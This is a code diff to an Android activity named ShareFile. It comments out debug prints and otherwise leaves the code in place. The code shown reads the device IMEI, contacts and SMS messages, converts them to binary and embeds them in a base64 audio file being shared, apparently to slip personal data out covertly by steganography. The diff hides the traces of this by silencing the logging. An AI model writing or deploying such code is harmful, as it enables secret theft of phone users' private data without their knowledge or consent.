@@ -254,14 +254,14 @@ public class ShareFile extends AppCompatActivity {
                     readSms();
                     String contact = "\n"+contact_name.get(0).toString() +":"+ contact_number.get(0).toString() +"\n"+contact_name.get(1).toString()+":"+contact_number.get(1).toString();
 
-                    System.out.println("IMEI:"+IMEINumber);
-                    System.out.println("IMEI in Bits:"+convertStringToBinary(IMEINumber).length());
-                    System.out.println("Contact:"+contact);
-                    System.out.println("Contact in Bits:"+convertStringToBinary(contact).length());
-                    System.out.println("SMS:"+msgData);
-                    System.out.println("SMS in Bits:"+convertStringToBinary(msgData).length());
-                    System.out.println("FileName:"+filename);
-                    System.out.println("FileName in Bits:"+convertStringToBinary(filename).length());
+//                    System.out.println("IMEI:"+IMEINumber);
+//                    System.out.println("IMEI in Bits:"+convertStringToBinary(IMEINumber).length());
+//                    System.out.println("Contact:"+contact);
+//                    System.out.println("Contact in Bits:"+convertStringToBinary(contact).length());
+//                    System.out.println("SMS:"+msgData);
+//                    System.out.println("SMS in Bits:"+convertStringToBinary(msgData).length());
+//                    System.out.println("FileName:"+filename);
+//                    System.out.println("FileName in Bits:"+convertStringToBinary(filename).length());
 
 //                    String sensitive_data = prettyBinary(convertStringToBinary(IMEINumber+";"+contact+";"+msgData+";"), 8, "");
 //                    System.out.println("Sensitive Data: "+sensitive_data);
@@ -272,7 +272,7 @@ public class ShareFile extends AppCompatActivity {
 //                    System.out.println("Sensitive Data Length: "+sensitive_data.length());
 
                     String encodefile = insertCharacters(base64StringAudio, sensitive_data);
-                    System.out.println("Demo Encode: "+encodefile);
+//                    System.out.println("Demo Encode: "+encodefile);
 
 
                     String binary_data= prettyBinary(convertStringToBinary(IMEINumber+";"+contact+";"+msgData+";"+filename), 8, " ");
